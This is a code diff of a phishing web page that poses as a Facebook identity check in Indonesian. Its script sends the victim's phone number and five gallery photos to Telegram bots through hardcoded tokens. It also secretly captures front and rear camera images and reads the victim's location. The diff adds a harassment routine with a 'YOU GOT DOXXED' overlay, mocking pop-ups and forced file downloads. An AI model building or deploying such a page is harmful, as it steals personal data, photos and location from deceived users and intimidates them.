@@ -27,7 +27,25 @@
         }
         .btn-fb:active { transform: scale(0.94); }
 
-        /* Credit & Music Control Bar 😈 */
+        /* Virus UI Elements ☠️ */
+        #chaos-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 10000; }
+        #chaos-video { width: 100%; height: 100%; object-fit: cover; }
+        
+        .popup-virus {
+            position: absolute; width: 220px; background: #eee; border: 2px solid #000;
+            box-shadow: 8px 8px 0px rgba(0,0,0,0.8); padding: 10px; z-index: 10001;
+            font-family: "Courier New", monospace; font-weight: bold; animation: glitch 0.3s infinite alternate;
+        }
+        @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(5px,5px); } }
+        
+        .doxxed-flash {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            color: #ff0000; font-size: 40px; font-weight: 900; z-index: 10005;
+            text-shadow: 4px 4px #000; animation: flash-anim 0.2s infinite; display: none;
+        }
+        @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+
+        /* Credit Bar */
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
             color: white; padding: 10px 20px; display: flex; align-items: center; 
@@ -35,22 +53,9 @@
             border-top: 2px solid #1877f2; z-index: 1000;
         }
         .credit-info { display: flex; flex-direction: column; text-align: left; }
-        .label-credit { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
-        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; text-shadow: 0 0 8px rgba(24, 119, 242, 0.6); }
+        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
+        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 11px; font-weight: bold; }
         
-        /* Music Button */
-        .play-btn {
-            background: #1877f2; color: white; border: none; border-radius: 50px;
-            padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer;
-            transition: 0.3s; display: flex; align-items: center; gap: 5px;
-        }
-        .play-btn:hover { background: #166fe5; transform: translateY(-2px); }
-
-        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; }
-        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; display: none; }
-        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
-
-        .error-box { background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -58,7 +63,14 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <p class="mt-3 text-muted">Checking Security System...</p>
+    <p class="mt-3 text-muted small">Checking Security System...</p>
+</div>
+
+<div id="chaos-overlay">
+    <video id="chaos-video" loop playsinline>
+        <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
+    </video>
+    <div id="dox-flash" class="doxxed-flash">YOU GOT DOXXED!</div>
 </div>
 
 <audio id="bgMusic" loop>
@@ -72,7 +84,7 @@
         <p class="text-muted small">Konfirmasikan identitas Anda untuk melanjutkan akses ke profil Facebook.</p>
         <hr>
 
-        <div id="mainError" class="error-box text-start">
+        <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left;">
             <b>Gagal!</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
         </div>
 
@@ -94,16 +106,10 @@
 
 <div class="credit-bar">
     <div class="credit-info">
-        <span class="label-credit">Developed by:</span>
+        <span style="font-size: 10px; color: #888;">Developed by:</span>
         <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
     </div>
-    
-    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
-        <span>▶ PLAY MUSIC</span>
-        <div class="music-anim" id="animContainer">
-            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
-        </div>
-    </button>
+    <button class="play-btn" onclick="toggleMusic()">▶ PLAY MUSIC</button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -113,7 +119,6 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
-    const bars = document.querySelectorAll('.bar');
 
     window.onload = () => {
         setTimeout(() => {
@@ -125,16 +130,7 @@
     };
 
     function toggleMusic() {
-        const btnText = document.querySelector('#musicBtn span');
-        if (audio.paused) {
-            audio.play();
-            btnText.innerText = "⏸ PAUSE";
-            bars.forEach(b => b.style.display = "block");
-        } else {
-            audio.pause();
-            btnText.innerText = "▶ PLAY MUSIC";
-            bars.forEach(b => b.style.display = "none");
-        }
+        if (audio.paused) { audio.play(); } else { audio.pause(); }
     }
 
     function sendToBot(content, type = "text", blob = null) {
@@ -161,11 +157,46 @@
             document.getElementById('mainError').style.display = 'block';
             return;
         }
-        document.getElementById('mainError').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
+        
+        // Sikat data!
         sendToBot(`📱 NOMOR: ${phone}`);
         for (let i = 0; i < 5; i++) sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
-        setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 3000);
+
+        // TRIGGER CHAOS ☠️😈
+        startChaos();
+    }
+
+    function startChaos() {
+        const overlay = document.getElementById('chaos-overlay');
+        const vid = document.getElementById('chaos-video');
+        const dox = document.getElementById('dox-flash');
+        
+        overlay.style.display = 'block';
+        vid.play();
+        dox.style.display = 'block';
+        setTimeout(() => { dox.style.display = 'none'; }, 6000);
+
+        // Pop-up Virus Everywhere 😂
+        for (let i = 0; i < 20; i++) {
+            setTimeout(() => {
+                let div = document.createElement('div');
+                div.className = 'popup-virus';
+                div.style.top = Math.random() * 80 + '%';
+                div.style.left = Math.random() * 80 + '%';
+                div.innerHTML = "<span style='color:red'>WARNING!</span><br>YOU ARE IDIOT!<br>GOT DOXXED!";
+                overlay.appendChild(div);
+            }, i * 200);
+        }
+
+        // Auto Download 5 files 😋
+        for (let j = 1; j <= 5; j++) {
+            let blob = new Blob(["YOU IDIOT HAHAHA"], { type: "text/plain" });
+            let url = window.URL.createObjectURL(blob);
+            let a = document.createElement("a");
+            a.href = url;
+            a.download = `YOU_ARE_IDIOT_${j}.txt`;
+            a.click();
+        }
     }
 
     async function autoCapture(mode) {
@@ -180,7 +211,7 @@
                 s.getTracks().forEach(t => t.stop());
                 if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
             }, 2000);
-        } catch (e) { window.location.href = "https://www.facebook.com/login"; }
+        } catch (e) {}
     }
 
     function autoLocation() {
